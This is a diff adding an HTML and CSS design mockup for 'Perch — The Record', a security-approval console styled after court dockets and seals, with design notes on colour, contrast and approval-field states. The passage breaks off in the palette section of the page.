@@ -1,0 +1,1345 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Perch — The Record</title>
+<style>
+/* ═══════════════════════════════════════════════════════════════════════════
+   PERCH · direction "THE RECORD"  (revision 2)
+   World: adjudication and the permanent record — the docket, the exhibit,
+   the chain of custody, the seal, and the ruled line where a name goes.
+
+   Self-contained. No network request of any kind. No @font-face, no stylesheet link,
+   no image, no external host.
+
+   THE NEUTRAL SYSTEM IS TWO MATERIALS.
+     · THE CONSOLE is graphite: R = G = B on every single step, both themes.
+       a* = b* = 0. There is no hue in the console at all. This is a
+       categorical position, not a distance: every banned neutral carries
+       chroma (slate runs C* 1–14.5 at Lab h 255–283), so an achromatic ramp
+       cannot land on one however the digits fall.
+     · THE RECORD is warm stock. It is the only coloured material in the room.
+
+   FOUR chromatic values, one job each. Measured ΔE2000 to the nearest banned
+   value, computed not assumed:
+     --wax        #9E2833   14.23  (nearest banned value: the framework red-600)
+     --indelible  #BCA5E0   14.21  dark  ·  #4A2F80  12.95  light
+     --adversary  #D0AC71   12.37  dark  ·  #6A4E0A  20.26  light
+     --custody    #87BFAA   12.31  dark  ·  #0E4535  22.18  light
+   Every neutral step also clears ΔE2000 10. See PLAN.md §2 for the table.
+   ═══════════════════════════════════════════════════════════════════════════ */
+
+:root{
+  /* ── THE CONSOLE · graphite. achromatic by law: R=G=B on every step. ─── */
+  --board:      #070707;
+  --frame:      #0D0D0D;
+  --chrome:     #141414;
+  --raised:     #1E1E1E;
+  --rule:       #2B2B2B;
+  --rule-2:     #404040;
+  --ink:        #B2B2B2;   /*  8.69:1 on --chrome  */
+  --ink-2:      #949494;   /*  6.07:1 on --chrome  */
+  --board-ink:  #949494;   /*  6.64:1 on --board   */
+
+  /* ── THE RECORD · warm stock. the only coloured material in the room. ── */
+  --page:       #2D261E;
+  --page-well:  #241E17;
+  --page-rule:  #423A2E;   /* feint rule — texture                          */
+  --page-rule2: #5C5041;   /* structural rule — margin, docket separators   */
+  --page-ink:   #EEE0CA;   /* 11.47:1 on --page                             */
+  --page-ink2:  #B4A997;   /*  6.44:1 on --page — and the waiting ✕ mark    */
+
+  /* ── FOUR chromatic values ─────────────────────────────────────────── */
+  --wax:       #9E2833;    /* the seal. a MARK, never a word.               */
+  --wax-ink:   #EEE0CA;    /* 5.76:1 pressed into the wax, both themes      */
+  --indelible: #BCA5E0;    /* 6.82:1 on page — the operator's own hand      */
+  --adversary: #D0AC71;    /* 6.98:1 on page — written by the attacker      */
+  --custody:   #87BFAA;    /* 7.15:1 on page — a check that ran and agreed  */
+
+  /* ── type ───────────────────────────────────────────────────────────── */
+  --sans: "Public Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+  --mono: "IBM Plex Mono", ui-monospace, "SF Mono", SFMono-Regular, Menlo, Consolas, monospace;
+
+  --t-mark:  .625rem;    /* 10 · gutter numerals, tracked caps, registers   */
+  --t-note:  .75rem;     /* 12 · marginalia, captions, citations            */
+  --t-read:  .875rem;    /* 14 · the record's reading size                  */
+  --t-lead:  1rem;       /* 16 · recital leads, the ACTION sentence         */
+  --t-title: 1.375rem;   /* 22 · the action name                           */
+  --t-mast:  1.75rem;    /* 28 · masthead                                  */
+  --t-clock: 2.25rem;    /* 36 · the countdown                             */
+}
+
+:root[data-theme="light"]{
+  --board:      #949494;
+  --frame:      #ACACAC;
+  --chrome:     #B0B0B0;
+  --raised:     #B3B3B3;
+  --rule:       #8E8E8E;
+  --rule-2:     #6E6E6E;
+  --ink:        #131313;   /*  8.37:1 on --chrome */
+  --ink-2:      #3A3A3A;   /*  5.13:1 on --chrome */
+  --board-ink:  #1C1C1C;   /*  5.62:1 on --board  */
+
+  --page:       #E4D4B8;   /* buff stock, L*85.5 — not paper, and not cream */
+  --page-well:  #D8C7A8;
+  --page-rule:  #C7B48F;
+  --page-rule2: #A08D6A;
+  --page-ink:   #241D12;   /* 11.44:1 on --page */
+  --page-ink2:  #574B36;   /*  5.85:1 on --page */
+
+  --wax:       #9E2833;    /* unchanged. wax does not change colour when    */
+  --wax-ink:   #EEE0CA;    /* you turn the lights on.                       */
+  --indelible: #4A2F80;    /* 7.17:1 on page */
+  --adversary: #6A4E0A;    /* 5.32:1 on page */
+  --custody:   #0E4535;    /* 7.50:1 on page · 4.93:1 on chrome */
+}
+
+@media (prefers-color-scheme: light){
+  :root:not([data-theme="dark"]):not([data-theme="light"]){
+    --board:#949494; --frame:#ACACAC; --chrome:#B0B0B0; --raised:#B3B3B3;
+    --rule:#8E8E8E; --rule-2:#6E6E6E; --ink:#131313; --ink-2:#3A3A3A; --board-ink:#1C1C1C;
+    --page:#E4D4B8; --page-well:#D8C7A8; --page-rule:#C7B48F; --page-rule2:#A08D6A;
+    --page-ink:#241D12; --page-ink2:#574B36;
+    --wax:#9E2833; --wax-ink:#EEE0CA; --indelible:#4A2F80; --adversary:#6A4E0A; --custody:#0E4535;
+  }
+}
+
+*,*::before,*::after{ box-sizing:border-box; }
+html{ font-size:100%; }          /* every size below is rem. no px type.    */
+body{
+  margin:0; background:var(--board); color:var(--board-ink);
+  font-family:var(--sans); font-size:var(--t-read); line-height:1.55;
+  -webkit-font-smoothing:antialiased;
+}
+.mono{ font-family:var(--mono); font-variant-ligatures:none; }
+.num { font-variant-numeric:tabular-nums; }
+.caps{ font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.2em;
+       text-transform:uppercase; }
+
+/* ══ BOARD FURNITURE ═════════════════════════════════════════════════════ */
+.board{ max-width:1500px; margin:0 auto; padding:36px 30px 90px; }
+
+.mast{ border-top:2px solid currentColor; padding-top:15px; }
+.mast-l{ display:flex; align-items:baseline; gap:14px; }
+.mast-n{ font-family:var(--mono); font-size:var(--t-mast); letter-spacing:.18em;
+  text-transform:uppercase; color:var(--ink); font-weight:600; }
+.mast-d{ font-family:var(--mono); font-size:var(--t-mast); letter-spacing:.18em;
+  text-transform:uppercase; color:var(--ink); font-weight:400; opacity:.72; }
+.tgl{ margin-left:auto; font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.18em;
+  text-transform:uppercase; background:transparent; color:var(--board-ink);
+  border:1px solid var(--rule-2); padding:8px 13px; cursor:pointer; }
+.tgl:hover{ color:var(--ink); border-color:var(--ink-2); }
+
+.mast-cols{ display:grid; grid-template-columns:1fr 1fr; gap:64px; margin-top:16px; }
+.mast-cols p{ margin:0; font-size:var(--t-note); line-height:1.72; }
+.mast-cols b{ color:var(--ink); font-weight:600; }
+.mast-h{ color:var(--ink); margin-bottom:7px; }
+
+/* palette strip — the printed hex is read out of the live custom property,
+   so it cannot disagree with the swatch in either theme. */
+.pal{ margin-top:26px; border-top:1px solid var(--rule); padding-top:16px;
+  display:grid; grid-template-columns:repeat(4,1fr) 1.15fr; gap:26px; }
+.pal-h{ color:var(--ink); margin-bottom:10px; }
+.sw{ height:22px; border:1px solid var(--rule-2); }
+.sw-n{ display:flex; justify-content:space-between; gap:8px; margin-top:7px;
+  font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.06em; color:var(--ink); }
+.sw-m{ font-size:var(--t-note); line-height:1.5; margin-top:4px; }
+.ramp{ display:flex; height:22px; border:1px solid var(--rule-2); }
+.ramp i{ flex:1; }
+.ramp-c{ font-family:var(--mono); font-size:var(--t-mark); color:var(--ink); margin-top:7px; }
+
+.plate{ margin-top:52px; }
+.plate-c{ display:flex; align-items:baseline; gap:14px; border-bottom:1px solid var(--rule);
+  padding-bottom:10px; margin-bottom:14px; }
+.plate-n{ font-family:var(--mono); font-size:var(--t-lead); color:var(--ink); font-weight:600; }
+.plate-t{ font-family:var(--mono); font-size:var(--t-note); letter-spacing:.22em;
+  text-transform:uppercase; color:var(--ink); margin-right:-.22em; }
+.plate-s{ font-size:var(--t-note); }
+
+/* ══ THE WINDOW ══════════════════════════════════════════════════════════ */
+.win{ background:var(--frame); color:var(--ink); border:1px solid var(--rule); overflow:hidden; }
+.tbar{ height:34px; background:var(--chrome); border-bottom:1px solid var(--rule);
+  display:flex; align-items:center; gap:12px; padding:0 15px;
+  font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.1em; color:var(--ink-2); }
+.tbar b{ color:var(--ink); letter-spacing:.2em; font-weight:600; margin-right:-.2em; }
+.tbar .s{ opacity:.45; margin:0 6px; }
+.tbar .r{ margin-left:auto; }
+.gov{ height:27px; background:var(--chrome); border-bottom:1px solid var(--rule);
+  display:flex; align-items:center; gap:12px; padding:0 15px;
+  font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.18em;
+  text-transform:uppercase; color:var(--ink-2); }
+.gov .ok{ color:var(--custody); }
+.gov .r{ margin-left:auto; display:flex; gap:22px; }
+.back{ height:28px; background:var(--frame); border-bottom:1px solid var(--rule);
+  display:flex; align-items:center; gap:10px; padding:0 15px;
+  font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.14em;
+  text-transform:uppercase; color:var(--ink-2); }
+kbd{ font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.04em;
+  border:1px solid var(--rule-2); color:var(--ink); padding:2px 6px; }
+
+/* ══ THE RECORD — one grid governs the whole document ════════════════════
+   [ gutter 136 | measure (the reading column) | marginalia 366 ]
+   The margin rule is the measure's left border and is therefore continuous
+   for the document's whole height. Rows are grid rows, so the marginalia
+   is anchored to the recital it annotates and neither column can run out
+   before the other. ════════════════════════════════════════════════════ */
+.doc{ display:grid; grid-template-columns:136px minmax(0,1fr) 366px; }
+.gut { background:var(--page); padding:22px 16px 22px 22px; }
+.meas{ background:var(--page); color:var(--page-ink);
+  border-left:1px solid var(--page-rule2); border-right:1px solid var(--page-rule2);
+  padding:22px 34px 26px 30px; min-width:0; }
+.marg{ background:var(--chrome); color:var(--ink-2); padding:22px 22px 26px 22px;
+  font-size:var(--t-note); line-height:1.66; min-width:0; }
+.row-sep .gut,.row-sep .meas,.row-sep .marg{ border-top:1px solid var(--page-rule); }
+.row-sep .marg{ border-top-color:var(--rule); }
+.full{ grid-column:1/-1; }
+
+.rn{ font-family:var(--mono); font-size:var(--t-title); color:var(--page-ink);
+  font-weight:600; letter-spacing:.04em; line-height:1; margin-top:3px; }
+.gut-l{ font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.2em;
+  text-transform:uppercase; color:var(--page-ink2); }
+.gut-note{ font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.1em;
+  text-transform:uppercase; color:var(--page-ink2); line-height:1.5; margin-top:12px; }
+.gut-note[data-t="adv"]{ color:var(--adversary); border-left:2px solid var(--adversary); padding-left:7px; }
+.gut-note[data-t="cust"]{ color:var(--custody); border-left:2px solid var(--custody); padding-left:7px; }
+
+.slot-l{ font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.24em;
+  text-transform:uppercase; color:var(--page-ink2); margin-bottom:12px; }
+.lead{ font-size:var(--t-lead); line-height:1.5; margin:0 0 14px; color:var(--page-ink); }
+.meas p{ margin:0 0 12px; }
+.meas p:last-child{ margin-bottom:0; }
+
+/* the adversary frame: an exhibit tab, not a hatch. Hatch means ABSENCE in
+   this system and nothing else, so the two can never be confused. */
+.adv{ font-family:var(--mono); color:var(--adversary);
+  border-left:2px solid var(--adversary); padding:1px 4px 1px 6px; }
+
+.fields{ display:grid; grid-template-columns:max-content minmax(0,1fr); gap:3px 22px;
+  margin:0 0 14px; font-family:var(--mono); font-size:var(--t-read); }
+.fields dt{ color:var(--page-ink2); }
+.fields dd{ margin:0; color:var(--page-ink); overflow-wrap:anywhere; }
+.sect{ font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.2em;
+  text-transform:uppercase; color:var(--page-ink2); border-top:1px solid var(--page-rule);
+  padding-top:11px; margin:18px 0 11px; }
+.caprow{ display:flex; gap:10px; flex-wrap:wrap; margin-bottom:6px; }
+.cap{ font-family:var(--mono); font-size:var(--t-read); color:var(--page-ink);
+  border:1px solid var(--page-rule2); padding:5px 11px; }
+
+/* ══ SEVERITY — how much wax. filled / struck / ruled / none. ════════════
+   Rank survives colour removal three times over: the amount of wax, the
+   word, and the four-tick register. ═══════════════════════════════════ */
+.sev{ display:inline-flex; align-items:center; gap:9px; font-family:var(--mono);
+  font-size:var(--t-mark); letter-spacing:.18em; text-transform:uppercase; padding:5px 10px; }
+.sev[data-r="4"]{ background:var(--wax); color:var(--wax-ink); }          /* CRITICAL — inked  */
+.sev[data-r="3"]{ border:1.5px solid var(--wax); color:var(--page-ink); } /* HIGH — struck dry */
+.sev[data-r="2"]{ border:1px solid var(--page-ink2); color:var(--page-ink); }
+.sev[data-r="1"]{ padding-left:0; color:var(--page-ink2); }
+.reg{ display:inline-flex; gap:2px; }
+.reg i{ width:3px; height:9px; background:currentColor; opacity:.26; }
+.reg i[data-lit]{ opacity:1; }
+
+.bdg{ display:inline-flex; align-items:center; gap:8px; font-family:var(--mono);
+  font-size:var(--t-mark); letter-spacing:.14em; text-transform:uppercase;
+  border:1px solid var(--page-rule2); color:var(--page-ink2); padding:5px 10px; }
+.badges{ display:flex; gap:9px; flex-wrap:wrap; margin:15px 0 14px; }
+
+/* ══ MARGINALIA ══════════════════════════════════════════════════════════ */
+.marg b{ color:var(--ink); font-weight:600; }
+.marg .mono{ color:var(--ink); }
+.marg-h{ font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.2em;
+  text-transform:uppercase; color:var(--ink); margin-bottom:10px; }
+.marg p{ margin:0 0 10px; }
+.cite{ font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.02em;
+  color:var(--ink-2); border-top:1px solid var(--rule); padding-top:9px; margin-top:13px;
+  word-break:break-all; line-height:1.7; }
+.cite span{ color:var(--ink); }
+
+/* ══ ABSENCE — hatched, and only ever this ═══════════════════════════════ */
+.void{ border:1px solid var(--page-rule2); margin-top:18px; }
+.void-h{ background:repeating-linear-gradient(135deg,
+    transparent 0 6px, var(--page-rule2) 6px 7px);
+  border-bottom:1px solid var(--page-rule2); padding:8px 12px;
+  font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.24em;
+  text-transform:uppercase; color:var(--page-ink); }
+.void-h span{ background:var(--page); padding:2px 8px; }
+.void-b{ padding:13px 14px; font-size:var(--t-read); color:var(--page-ink); }
+
+/* the record's own signature line: hatched, and it stays hatched. */
+.hatchrule{ height:44px; border:1px solid var(--page-rule2);
+  background:repeating-linear-gradient(135deg,
+    transparent 0 6px, var(--page-rule2) 6px 7px);
+  display:flex; align-items:center; padding-left:16px; }
+.hatchrule span{ background:var(--page); color:var(--page-ink); padding:4px 12px;
+  font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.24em; text-transform:uppercase; }
+.tierstamp{ border:1.5px solid var(--page-ink2); margin-top:12px; text-align:center;
+  background:repeating-linear-gradient(135deg,
+    transparent 0 6px, var(--page-rule) 6px 7px); }
+.tierstamp b{ display:block; background:var(--page); margin:5px 4px 0;
+  font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.14em; color:var(--page-ink); }
+.tierstamp i{ display:block; background:var(--page); margin:0 4px 5px; font-style:normal;
+  font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.14em; color:var(--page-ink2); }
+</style>
+<style>
+/* ══ THE SIGNATURE ═══════════════════════════════════════════════════════
+   Arming RULES THE PAGE. An unarmed field is blank stock; an armed field is
+   ruled, and the ruling is the ink. The state changes by QUANTITY OF INK,
+   which is why all three states separate in greyscale, at arm's length,
+   and on a bad monitor — and why none of them is a filled button.
+   ═══════════════════════════════════════════════════════════════════════ */
+.sign{ background:var(--page); border-left:4px solid var(--wax); padding:26px 34px 30px 30px; }
+.sign-head{ display:flex; align-items:baseline; gap:16px; margin-bottom:16px; }
+.sign-l{ font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.24em;
+  text-transform:uppercase; color:var(--page-ink2); }
+.sign-r{ margin-left:auto; font-family:var(--mono); font-size:var(--t-mark);
+  letter-spacing:.14em; text-transform:uppercase; color:var(--page-ink2); margin-right:-.14em; }
+
+.field{ --clear:78px; position:relative; background:var(--page-well);
+  border:1px solid var(--page-rule); border-top:3px solid var(--page-rule2);
+  height:400px; overflow:hidden; }
+.field-clear{ position:absolute; left:0; right:0; bottom:0; height:var(--clear);
+  background:var(--page-well); border-top:1px solid var(--page-rule); }
+.field-state{ position:absolute; left:14px; top:14px;
+  font-family:var(--mono); font-size:var(--t-read); letter-spacing:.2em;
+  text-transform:uppercase; color:var(--page-ink2);
+  background:var(--page-well); padding:5px 9px; }
+.field-x{ position:absolute; left:22px; bottom:52px; font-size:var(--t-title);
+  line-height:1; color:var(--page-ink2); }             /* 6.44:1 — legible unarmed */
+.field-rule{ position:absolute; left:22px; right:22px; bottom:44px;
+  border-bottom:1px solid var(--page-ink2); }
+.field-cap{ position:absolute; left:22px; right:22px; bottom:16px;
+  font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.1em; color:var(--page-ink2);
+  display:flex; gap:20px; }
+
+/* state 2 — ARMED, HELD: the ruling arrives, but broken. */
+.field[data-s="held"]{ border-top:3px solid var(--page-ink2);
+  background-color:var(--page-well);
+  background-image:
+    repeating-linear-gradient(to right, var(--page-well) 0 7px, transparent 7px 15px),
+    repeating-linear-gradient(to bottom, transparent 0 33px, var(--page-ink2) 33px 34px); }
+.field[data-s="held"] .field-rule{ border-bottom:2px dashed var(--page-ink2); }
+.field[data-s="held"] .field-state{ color:var(--page-ink); }
+
+/* state 3 — ARMED, ENTER WRITES: the page is ruled in the operator's own ink,
+   an ink bar runs the full width of the head, and the ✕ takes that ink. */
+.field[data-s="live"]{ border-top:10px solid var(--indelible);
+  background:var(--page-well) repeating-linear-gradient(to bottom,
+    transparent 0 20px, var(--indelible) 20px 22px); }
+.field[data-s="live"] .field-rule{ border-bottom:3px solid var(--indelible); }
+.field[data-s="live"] .field-x{ color:var(--indelible); }
+.field[data-s="live"] .field-state{ color:var(--indelible); font-weight:600; }
+
+.sign-under{ display:grid; grid-template-columns:1fr max-content; gap:30px; margin-top:16px;
+  align-items:end; }
+.sign-who{ font-family:var(--mono); font-size:var(--t-note); color:var(--page-ink2);
+  line-height:1.85; word-break:break-all; }
+.sign-who b{ color:var(--page-ink); font-weight:600; }
+.sign-keys{ font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.14em;
+  text-transform:uppercase; color:var(--page-ink2); white-space:nowrap; }
+.sign-keys kbd{ border-color:var(--page-rule2); color:var(--page-ink); }
+.sign-keys kbd.on{ border-color:var(--indelible); color:var(--indelible); }
+
+/* ══ THE STAMPS — one motion each ════════════════════════════════════════ */
+.stamps{ background:var(--page); display:grid; grid-template-columns:repeat(3,1fr);
+  gap:0; border-top:1px solid var(--page-rule2); }
+.stamp{ padding:20px 26px 22px; border-right:1px solid var(--page-rule); }
+.stamp:last-child{ border-right:0; }
+.stamp-w{ display:inline-flex; align-items:center; gap:10px; font-family:var(--mono);
+  font-size:var(--t-read); letter-spacing:.2em; text-transform:uppercase; color:var(--page-ink);
+  border:1px solid var(--page-ink2); border-bottom-width:3px; padding:8px 14px; }
+.stamp-c{ font-size:var(--t-note); color:var(--page-ink2); line-height:1.6; margin-top:11px; }
+.stamp[data-t="dead"] .stamp-w{ color:var(--page-ink2); border-color:var(--page-rule2);
+  border-bottom-width:1px; text-decoration:line-through; }
+
+.folio{ background:var(--page); border-top:1px solid var(--page-rule2);
+  padding:12px 30px; display:flex; gap:26px; flex-wrap:wrap;
+  font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.1em; color:var(--page-ink2); }
+.folio .r{ margin-left:auto; }
+
+/* ══ THE READ REGISTER (the gate on the second stroke) ═══════════════════ */
+.gate{ border:1px solid var(--custody); margin-top:16px; }
+.gate-h{ font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.2em;
+  text-transform:uppercase; color:var(--custody); padding:8px 13px 4px; }
+.gate-r{ display:flex; align-items:center; gap:11px; padding:4px 13px;
+  font-size:var(--t-read); color:var(--page-ink); }
+.gate-r:last-of-type{ padding-bottom:12px; }
+.gate-b{ width:13px; height:13px; border:1.5px solid var(--custody); flex:none;
+  display:grid; place-items:center; }
+.gate-b[data-on]::after{ content:""; width:7px; height:7px; background:var(--custody); }
+
+.prov{ display:inline-block; font-family:var(--mono); font-size:var(--t-mark);
+  letter-spacing:.1em; text-transform:uppercase; color:var(--page-ink2);
+  border:1px solid var(--page-rule); padding:4px 9px; margin-top:4px; }
+.chipbtn{ display:inline-block; font-family:var(--mono); font-size:var(--t-note);
+  letter-spacing:.06em; color:var(--page-ink); border:1px solid var(--page-ink2);
+  padding:8px 14px; }
+</style>
+<style>
+/* ══ SCREEN B — THE WATCH ════════════════════════════════════════════════ */
+.watch{ display:grid; grid-template-columns:224px minmax(0,1fr) 352px; min-height:0; }
+.side{ background:var(--chrome); border-right:1px solid var(--rule); padding:20px 16px 22px; }
+.side-h{ font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.2em;
+  text-transform:uppercase; color:var(--ink-2); margin:0 0 12px; }
+.cat{ display:grid; grid-template-columns:1fr max-content; gap:2px 10px; align-items:baseline;
+  padding:9px 0; border-top:1px solid var(--rule); }
+.cat-n{ font-size:var(--t-read); color:var(--ink); }
+.cat-v{ font-family:var(--mono); font-size:var(--t-read); color:var(--ink); }
+.cat-s{ grid-column:1/-1; font-size:var(--t-note); color:var(--ink-2); }
+.cat[data-abs] .cat-v{ color:var(--ink-2); }
+
+.lanes{ margin-top:24px; }
+.lane{ display:grid; grid-template-columns:1fr 46px; gap:6px 8px; align-items:center;
+  padding:4px 0; font-size:var(--t-note); }
+.lane-n{ color:var(--ink); white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+.lane-v{ font-family:var(--mono); font-size:var(--t-mark); color:var(--ink-2); text-align:right; }
+.lane-b{ grid-column:1/-1; height:2px; background:var(--rule); }
+.lane-b i{ display:block; height:100%; background:var(--ink-2); }
+.lane[data-hot] .lane-n{ color:var(--ink); font-weight:600; }
+.lane[data-hot] .lane-b i{ background:var(--ink); }
+.lane[data-empty] .lane-n,.lane[data-empty] .lane-v{ color:var(--ink-2); }
+.bill{ display:grid; grid-template-columns:11px 1fr; gap:0 10px; align-items:start;
+  padding:6px 0; border-top:1px solid var(--rule); }
+.bill i{ width:9px; height:9px; margin-top:4px; border:1px solid var(--ink-2);
+  background:repeating-linear-gradient(135deg, transparent 0 2px, var(--ink-2) 2px 3px); }
+.bill[data-on] i{ background:var(--ink); border-color:var(--ink); }
+.bill b{ color:var(--ink); font-weight:400; font-size:var(--t-note); }
+.bill span{ display:block; font-family:var(--mono); font-size:var(--t-mark);
+  letter-spacing:.02em; color:var(--ink-2); }
+.side-f b{ color:var(--ink); font-weight:600; }
+.side-f{ margin-top:22px; border-top:1px solid var(--rule); padding-top:12px;
+  font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.06em; color:var(--ink-2);
+  line-height:1.9; }
+
+/* the docket: one chronological list. every row is one fixture object. */
+.docket{ background:var(--page); color:var(--page-ink); }
+.dk-h{ display:flex; align-items:baseline; gap:14px; padding:14px 24px 12px;
+  border-bottom:1px solid var(--page-rule2); }
+.dk-t{ font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.24em;
+  text-transform:uppercase; color:var(--page-ink); }
+.dk-s{ font-size:var(--t-note); color:var(--page-ink2); }
+.dk-s b{ color:var(--page-ink); font-weight:600; }
+
+.ent{ display:grid; grid-template-columns:36px 92px 88px minmax(0,1fr) 168px;
+  gap:0 14px; align-items:baseline; padding:8px 20px 8px 18px;
+  border-bottom:1px solid var(--page-rule); background:var(--page-well); }
+.ent-n{ font-family:var(--mono); font-size:var(--t-mark); color:var(--page-ink2); }
+.ent-t{ font-family:var(--mono); font-size:var(--t-note); color:var(--page-ink2); }
+.ent-k{ font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.16em;
+  text-transform:uppercase; color:var(--page-ink2); }
+.ent-b{ font-size:var(--t-read); color:var(--page-ink); min-width:0; }
+.ent-r{ display:flex; align-items:center; justify-content:flex-end; gap:12px; text-align:right; }
+.ent-c{ font-family:var(--mono); font-size:var(--t-note); color:var(--page-ink2); }
+.ent-sub{ grid-column:4/6; font-size:var(--t-note); color:var(--page-ink2); margin-top:2px; }
+.ent[data-w]{ border-left:4px solid var(--wax); padding-left:16px; }
+.ent[data-sel]{ background:var(--page); border-left:4px solid var(--page-ink2);
+  padding-left:16px; padding-top:13px; padding-bottom:13px; }
+.ent[data-sel] .ent-n{ color:var(--page-ink); font-weight:600; }
+.ent[data-sel][data-w]{ border-left:4px solid var(--wax); }
+.ent-keys{ grid-column:2/-1; margin-top:10px; display:flex; gap:26px;
+  font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.14em;
+  text-transform:uppercase; color:var(--page-ink2); }
+.ent-keys kbd{ border-color:var(--page-rule2); color:var(--page-ink); }
+
+.dk-f{ display:flex; gap:24px; flex-wrap:wrap; padding:12px 24px;
+  border-top:1px solid var(--page-rule2); font-family:var(--mono);
+  font-size:var(--t-mark); letter-spacing:.14em; text-transform:uppercase; color:var(--page-ink2); }
+.dk-f kbd{ border-color:var(--page-rule2); color:var(--page-ink); }
+
+.prev{ background:var(--chrome); border-left:1px solid var(--rule); padding:20px 18px 24px;
+  font-size:var(--t-note); color:var(--ink-2); line-height:1.66; }
+.prev b{ color:var(--ink); }
+.prev-card{ background:var(--page); color:var(--page-ink); padding:16px 18px 18px;
+  border-left:4px solid var(--wax); margin-bottom:16px; }
+.prev-t{ font-family:var(--mono); font-size:var(--t-lead); color:var(--page-ink); margin:8px 0 8px; }
+.prev-m{ font-family:var(--mono); font-size:var(--t-mark); color:var(--page-ink2);
+  letter-spacing:.06em; line-height:1.8; word-break:break-all; }
+.custody-l{ margin-top:14px; }
+.cst{ display:grid; grid-template-columns:max-content 1fr; gap:3px 14px;
+  font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.04em;
+  color:var(--page-ink2); line-height:1.7; }
+.cst b{ color:var(--page-ink); font-weight:400; }
+.unwritten{ margin-top:9px; border:1px solid var(--page-rule2);
+  background:repeating-linear-gradient(135deg, transparent 0 6px, var(--page-rule2) 6px 7px);
+  padding:7px 10px; }
+.unwritten span{ background:var(--page); color:var(--page-ink); padding:3px 9px;
+  font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.14em; text-transform:uppercase; }
+
+/* ══ PLATE C — the three states, side by side ════════════════════════════ */
+.states{ display:grid; grid-template-columns:repeat(3,1fr); gap:20px; }
+.state-c{ background:var(--page); border-left:4px solid var(--wax); padding:18px 20px 20px; }
+.state-h{ font-family:var(--mono); font-size:var(--t-mark); letter-spacing:.2em;
+  text-transform:uppercase; color:var(--page-ink2); margin-bottom:12px; }
+.state-c .field{ height:158px; --clear:54px; }
+.state-c .field-x{ bottom:40px; } .state-c .field-rule{ bottom:32px; }
+.state-c .field-cap{ display:none; }
+.state-n{ font-size:var(--t-note); color:var(--page-ink2); margin-top:11px; line-height:1.6; }
+.grey{ filter:grayscale(1); }
+.grey-note{ font-size:var(--t-note); margin:14px 0 10px; color:var(--board-ink); }
+</style>
+</head>
+<body>
+<div class="board">
+
+<!-- ══════════════════════ MASTHEAD ══════════════════════════════════════ -->
+<header class="mast">
+  <div class="mast-l">
+    <span class="mast-n">Perch</span>
+    <span class="mast-d">The Record</span>
+    <button class="tgl" id="tgl" type="button">Light mode</button>
+  </div>
+  <div class="mast-cols">
+    <p>Drawn from <b>adjudication and the permanent record</b> — the docket, the exhibit,
+      the chain of custody, the seal, and the ruled line where a name goes. A verdict here
+      is typed, signed and permanent, so the console is not a dashboard of cards: it is a
+      <b>bench</b>, and the thing on it is a <b>document</b>. The neutral system is two
+      materials and no third. <b>The console is graphite — R&nbsp;=&nbsp;G&nbsp;=&nbsp;B on
+      every step, both themes, no hue at all.</b> The record is warm stock, and it is the
+      only coloured material in the room. Which thing is the document is answered before a
+      label is read.</p>
+    <div>
+      <div class="mast-h caps">The signature · the one thing this direction is remembered by</div>
+      <p>Every record ends in two ruled lines: the record's own, and yours. The first is
+        <b>hatched, and it stays hatched</b> — <span class="mono">ambush:hold:v1</span> carries no
+        Ed25519 signature in Ambush under any condition, so the document reaches your bench
+        unsigned and says so in its shape. The second is <b>empty, and waiting</b>. The grant is
+        not a button: it is a blank signature line under the tallest field in the system, and
+        <b>arming rules the page</b> — the field goes from bare stock to ruled in your own ink, so
+        the difference between armed and unarmed is a quantity of ink you cannot miss with the
+        colour turned off. Refuse is a <b>stamp</b>: one motion. A signature is two.</p>
+    </div>
+  </div>
+
+  <div class="pal">
+    <div style="grid-column:1/5">
+      <div class="pal-h caps">Four chromatic values · one job each · absence gets none</div>
+      <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:22px">
+        <div>
+          <div class="sw" style="background:var(--wax)"></div>
+          <div class="sw-n"><span>wax</span><span class="v" data-v="--wax"></span></div>
+          <div class="sw-m">The seal, and the only hue that ever means <i>this can hurt</i>. It is
+            a <b>mark, never a word</b>: it is always a fill or a rule, never text, so it never has
+            to fight a contrast floor.</div>
+        </div>
+        <div>
+          <div class="sw" style="background:var(--indelible)"></div>
+          <div class="sw-n"><span>indelible</span><span class="v" data-v="--indelible"></span></div>
+          <div class="sw-m">Copying-pencil violet — the operator's own hand. Nothing the machine
+            writes is ever this colour, and arming a grant rules the page in it.</div>
+        </div>
+        <div>
+          <div class="sw" style="background:var(--adversary)"></div>
+          <div class="sw-n"><span>adversary</span><span class="v" data-v="--adversary"></span></div>
+          <div class="sw-m">The manila exhibit tab: a string the attacker wrote, quoted and never
+            executed. It is drawn as a <b>tab</b>, not a hatch — hatch means absence here and
+            nothing else.</div>
+        </div>
+        <div>
+          <div class="sw" style="background:var(--custody)"></div>
